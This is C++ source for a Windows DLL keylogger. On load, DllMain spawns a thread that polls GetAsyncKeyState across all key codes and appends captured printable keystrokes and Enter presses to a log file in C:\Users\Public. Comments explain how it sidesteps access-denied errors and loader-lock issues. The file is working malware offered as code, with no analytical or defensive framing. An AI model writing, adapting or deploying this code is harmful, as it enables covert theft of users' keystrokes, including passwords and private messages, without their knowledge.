#include "pch.h"
#include <stdio.h>

void LogKey(int key) {

	FILE* f;
	//write to Public folder to avoid Access Denied error
	fopen_s(&f, "C:\\Users\\Public\\content.log", "a");
	if (f) {

		if (key >= 32 && key <= 126) {
			fprintf(f,"%c",(char)key);
		}
		else if (key == VK_RETURN) //ENTER key
			fprintf(f, "\n[ENTER]\n");

		fclose(f);
	}
}

// implicit Thread, adhering to Windows's memory rules (cleaning up stack)
DWORD WINAPI KeyloggerThread(LPVOID lpParam) {

	while (TRUE) {

		for (int i = 8; i <= 255; i++) {
			// if MSB (most significant bit) is on, key is being pressed
			if (GetAsyncKeyState(i) & 0x8000) {
				LogKey(i);
				while (GetAsyncKeyState(i) & 0x8000) Sleep(10);
			}
		}

		Sleep(10); //give this thread a break, avoiding take up too much CPU
	}

	return 0;

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {

	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		// isolate the thread created for KeyloggerThread, bypassing Loader Lock
		CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
		break;
	}
	return TRUE;
}